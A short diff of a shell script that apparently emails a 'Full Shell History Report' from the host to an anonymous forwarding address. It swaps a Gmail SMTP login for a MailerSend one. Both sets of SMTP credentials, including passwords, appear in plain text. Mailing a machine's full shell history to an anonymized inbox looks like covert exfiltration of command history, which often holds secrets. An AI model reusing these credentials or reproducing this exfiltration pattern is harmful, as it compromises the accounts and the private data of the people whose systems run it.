@@ -74,11 +74,16 @@ EOF
     recipient="ff3963a2-ad37-4797-bde9-ac5b76448d8d@jamy.anonaddy.com"
     subject="Full Shell History Report from $HOSTNAME"
 
-    smtp_server="smtp.gmail.com"
-    port=587
-    sender_email="acen.bergheim@googlemail.com"
-    password="!55Mama55!"
+#    smtp_server="smtp.gmail.com"
+#    port=587
+#    sender_email="acen.bergheim@googlemail.com"
+#    password="!55Mama55!"
 
+    smtp_server="smtp.mailersend.net"
+    port=587
+    sender_email="MS_wfRIsR@trial-yxj6lj9x6614do2r.mlsender.net"
+    password="mssp.JfxiTRI.351ndgwy7ndlzqx8.AMTiGYy"
+    
     LOG_FILE="/tmp/system_report_email.log"
     TEMP_FILE=$(mktemp)
     echo -n "$EMAIL_CONTENT" > "$TEMP_FILE"
